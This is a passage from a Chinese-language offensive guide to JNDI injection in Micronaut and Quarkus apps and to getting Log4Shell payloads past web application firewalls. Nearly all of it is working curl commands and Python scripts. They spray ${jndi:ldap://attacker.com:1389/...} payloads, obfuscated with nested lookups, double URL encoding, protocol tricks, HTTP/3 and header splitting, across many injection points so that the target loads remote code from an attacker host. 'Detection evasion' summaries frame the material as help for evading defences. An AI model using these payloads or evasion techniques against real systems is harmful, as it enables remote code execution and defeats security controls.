# Micronaut 的 ApplicationContext 支持自定义 bean 解析
# 若有端点允许指定 bean 名称，可能触发 JNDI

# 测试 Micronaut bean 查找端点
curl -i "http://target.com/api/bean?name=ldap://attacker.com:1389/Exploit"

# Micronaut 的 @Value 注解支持 ${...} 占位符
# 若占位符内容用户可控:
curl -i -X POST http://target.com/api/settings \
  -H "Content-Type: application/json" \
  -d '{"value":"\${jndi:ldap://attacker.com:1389/Exploit}"}'
```

**步骤 4：利用 Quarkus Qute 模板注入（链式）**

```bash
# Quarkus Qute 模板引擎支持表达式
# 若用户输入进入模板，可执行任意表达式

# 测试 Qute 模板注入
curl -i "http://target.com/api/render?template=\${7*7}"
# 若返回 49 → Qute 模板注入确认

# Qute 表达式可调用 Java 方法
curl -i "http://target.com/api/render?template=\{config:property('quarkus.datasource.url')\}"
# 读取配置属性

# 链式: Qute 注入 → 读取配置 → 修改 datasource URL 为 JNDI
curl -i "http://target.com/api/render?template=\{inject:io.quarkus.runtime.configuration.ConfigProvider\}"
```

**步骤 5：GraalVM Native Image 限制下的 JNDI**

```bash
# Quarkus 常编译为 GraalVM Native Image
# Native Image 默认禁用反射和动态类加载
# 但 JNDI 的某些路径仍然可用

# 测试 DNS-only JNDI（Native Image 支持 DNS）
curl -i http://target.com/ \
  -H "User-Agent: \${jndi:dns://attacker.com/test}"

# 即使是 Native Image，DNS JNDI 仍可能工作
# 用于确认 JNDI 注入点存在

# 利用 Native Image 的 Resources 配置
# 若 resources-config.json 包含了某些类，反射可用
# 检查 /META-INF/native-image/ 下的配置
```

**步骤 6：云原生环境下的 JNDI 持久化**

```python
# cloud_native_jndi.py - Quarkus/Micronaut 云原生 JNDI 利用
import requests

TARGET = "http://target.com"

def quarkus_config_injection():
    """
    Quarkus 配置注入 + JNDI
    """
    # 尝试修改 datasource URL
    config_endpoints = [
        "/api/config",
        "/q/config",
        "/admin/config",
        "/api/settings",
    ]
    
    jndi_payload = "ldap://attacker.com:1389/Exploit"
    
    for endpoint in config_endpoints:
        # 尝试 JSON body
        r = requests.post(f"{TARGET}{endpoint}", 
                         json={"datasource.url": jndi_payload})
        print(f"[*] {endpoint}: {r.status_code}")
        
        # 尝试 form data
        r = requests.post(f"{TARGET}{endpoint}",
                         data={"quarkus.datasource.url": jndi_payload})
        
        # 尝试 header 注入
        r = requests.get(f"{TARGET}{endpoint}",
                        headers={"X-Datasource-Url": jndi_payload})

def micronaut_bean_lookup():
    """
    Micronaut bean 查找 JNDI
    """
    endpoints = [
        "/api/bean",
        "/api/context",
        "/api/resolve",
    ]
    
    for endpoint in endpoints:
        r = requests.get(f"{TARGET}{endpoint}",
                        params={"name": "ldap://attacker.com:1389/Exploit"})
        print(f"[*] {endpoint}: {r.status_code}")

quarkus_config_injection()
micronaut_bean_lookup()
```

**检测规避要点**：
- Quarkus/Micronaut 的配置端点常被忽视，是 JNDI 新入口
- Qute 模板注入可作为 JNDI 的前置链
- Native Image 限制了远程类加载，但 DNS JNDI 仍可用
- 云原生环境中配置注入比代码注入更常见

---

### 攻击链 5：JNDI 检测绕过（WAF bypass with Unicode/encoding）

**场景**：目标部署了 WAF 规则拦截 `${jndi:`、`ldap://`、`rmi://` 等 JNDI 特征字符串。需要通过编码和混淆绕过检测。

**步骤 1：Unicode 编码绕过**

```bash
# WAF 拦截 ${jndi: → 使用 Unicode 转义
# 注意: Unicode 绕过取决于 Log4j/应用是否解析 Unicode

# ${jndi: 的 Unicode 表示
# $ = \u0024
# { = \u007b
# j = \u006a
# n = \u006e
# d = \u0064
# i = \u0069
# : = \u003a

# 但 Log4j 的 lookup 不解析 Unicode 转义
# 需利用 Log4j 的内置 lookup 实现混淆

# 方法 1: lower/upper lookup
curl -i http://target.com/ \
  -H "User-Agent: \${\${lower:j}ndi:ldap://attacker.com:1389/x}"

# 方法 2: 默认值 lookup（env:KEY:-default）
curl -i http://target.com/ \
  -H "User-Agent: \${\${env:NaN:-j}ndi:ldap://attacker.com:1389/x}"

# 方法 3: 反向查找（::-字符）
curl -i http://target.com/ \
  -H "User-Agent: \${\${::-j}\${::-n}\${::-d}\${::-i}:ldap://attacker.com:1389/x}"

# 方法 4: 混合大小写
curl -i http://target.com/ \
  -H "User-Agent: \${\${lower:J}NDI:ldap://attacker.com:1389/x}"
```

**步骤 2：URL 编码绕过**

```bash
# WAF 可能对 ${jndi: 做了 URL 解码后的检测
# 双重 URL 编码绕过

# 原始: ${jndi:ldap://attacker.com:1389/x}
# URL 编码: %24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%3A1389%2Fx%7D
# 双重编码: %2524%257Bjndi%253Aldap%253A%252F%252Fattacker.com%253A1389%252Fx%257D

curl -i "http://target.com/?q=%2524%257Bjndi%253Aldap%253A%252F%252Fattacker.com%253A1389%252Fx%257D"

# 若 WAF 只解码一次，双重编码绕过
# 应用服务器再解码一次得到原始 payload
```

**步骤 3：协议混淆绕过**

```bash
# WAF 拦截 ldap:// 和 rmi:// → 使用其他 JNDI 协议

# DNS 协议（用于探测，不触发 RCE）
curl -i http://target.com/ \
  -H "User-Agent: \${jndi:dns://attacker.com/test}"

# IIOP 协议（较少被 WAF 规则覆盖）
curl -i http://target.com/ \
  -H "User-Agent: \${jndi:iiop://attacker.com:7777/Exploit}"

# 协议嵌套
curl -i http://target.com/ \
  -H "User-Agent: \${jndi:\${lower:l}\${lower:d}\${lower:a}\${lower:p}://attacker.com:1389/x}"

# 大小写混合协议
curl -i http://target.com/ \
  -H "User-Agent: \${jndi:LDAP://attacker.com:1389/x}"
# Java 的 JNDI 协议匹配可能不区分大小写
```

**步骤 4：HTTP/3 (QUIC) 绕过**

```bash
# 大多数 WAF 只检查 TCP/HTTP1-2 流量
# 通过 HTTP/3 (QUIC, UDP/443) 发送 payload 绕过

# 使用支持 HTTP/3 的客户端
curl --http3 http://target.com/ \
  -H "User-Agent: \${jndi:ldap://attacker.com:1389/x}"

# WAF 若只检查 TCP 443 → QUIC 流量不被检测
# payload 完整到达后端
```

**步骤 5：分片/拆分绕过**

```bash
# WAF 基于单请求检测 → 分片到多个请求

# 方法 1: 分割到多个 HTTP 头
curl -i http://target.com/ \
  -H "X-Custom-1: \${" \
  -H "X-Custom-2: jndi:" \
  -H "X-Custom-3: ldap://attacker.com:1389/x}"
# 若应用日志聚合多个头 → 拼接成完整 payload

# 方法 2: 利用日志聚合（多个请求的日志被合并处理）
# 请求 1
curl -i http://target.com/ -H "X-Data: \${jndi:ldap://attacker.com:1389/"
# 请求 2
curl -i http://target.com/ -H "X-Data: exploit}"
# 若日志聚合器拼接: ${jndi:ldap://attacker.com:1389/exploit}

# 方法 3: 利用 chunked transfer encoding 分片
curl -i http://target.com/ \
  -H "Transfer-Encoding: chunked" \
  -H "User-Agent: \${j" \
  -d $'ndi:ldap://attacker.com:1389/x}'
```

**步骤 6：自动化 WAF 绕过测试**

```python
# jndi_waf_bypass.py - JNDI WAF 绕过自动化测试
import requests

TARGET = "http://target.com/"
ATTACKER = "attacker.com:1389"

# JNDI payload 混淆变体库
payloads = [
    # 基础
    "${jndi:ldap://ATTACKER/x}",
    # lower/upper
    "${${lower:j}ndi:ldap://ATTACKER/x}",
    "${${upper:j}${upper:n}${upper:d}i:ldap://ATTACKER/x}",
    # 默认值
    "${${env:NaN:-j}ndi${env:NaN:-:}ldap://ATTACKER/x}",
    # 反向查找
    "${${::-j}${::-n}${::-d}${::-i}:ldap://ATTACKER/x}",
    "${j${::-n}di:ldap://ATTACKER/x}",
    "${j${k8s:k5:-ND}i${sd:-k}:ldap://ATTACKER/x}",
    # 协议混淆
    "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://ATTACKER/x}",
    "${jndi:LDAP://ATTACKER/x}",
    # 嵌套
    "${${lower:${lower:j}}ndi:ldap://ATTACKER/x}",
    "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://ATTACKER/x}",
]

# 注入点
headers_to_test = [
    "User-Agent",
    "X-Forwarded-For",
    "Referer",
    "X-Api-Version",
    "Accept-Language",
    "Cookie",
    "X-Real-IP",
    "X-Client-IP",
]

for payload_template in payloads:
    payload = payload_template.replace("ATTACKER", ATTACKER)
    for header in headers_to_test:
        r = requests.get(TARGET, headers={header: payload})
        # 检查响应是否触发（取决于 WAF 行为）
        # 200 = 可能绕过, 403 = 被拦截
        if r.status_code == 200:
            print(f"[+] 可能绕过: {header}: {payload}")
```

**检测规避要点**：
- Log4j 的 lookup 语法极其灵活，几乎不可能完全通过签名拦截
- 双重 URL 编码绕过只解码一次的 WAF
- HTTP/3 (QUIC) 是 2026 年 WAF 盲区的常见绕过方式
- 分片到多个请求/头部绕过单请求签名检测
